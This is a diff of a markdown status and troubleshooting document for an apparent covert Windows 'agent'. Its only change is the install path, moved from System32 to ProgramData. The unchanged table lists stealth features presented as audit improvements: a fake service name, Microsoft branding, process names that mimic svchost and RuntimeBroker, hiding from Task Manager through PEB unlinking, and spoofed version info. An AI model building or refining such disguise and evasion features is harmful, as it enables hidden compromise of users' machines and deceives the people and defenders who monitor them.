@@ -62,7 +62,7 @@ All security improvements from the audit have been successfully implemented and 
 |---------|--------|-------------|
 | Realistic Service Name | ✅ Active | WinDiagnosticHost |
 | Windows Branding | ✅ Active | Microsoft Corporation |
-| System32 Installation | ✅ Active | C:\Windows\System32\DiagnosticHost |
+| ProgramData Installation | ✅ Active | C:\\ProgramData\\DiagnosticHost |
 | Process Name Obfuscation | ✅ Ready | Mimic svchost, RuntimeBroker |
 | Task Manager Hiding | ✅ Ready | PEB unlinking |
 | Version Info Spoofing | ✅ Active | 10.0.19041.0 (Win10) |
@@ -447,7 +447,7 @@ From original audit (all CRITICAL items addressed):
 ### Troubleshooting
 
 **Q: Agent won't connect**
-A: Check `C:\Windows\System32\DiagnosticHost\logs\diagnostics.log` (encrypted)
+A: Check `C:\\ProgramData\\DiagnosticHost\logs\diagnostics.log` (encrypted)
 
 **Q: Service won't start**
 A: Check Event Viewer → Windows Logs → System
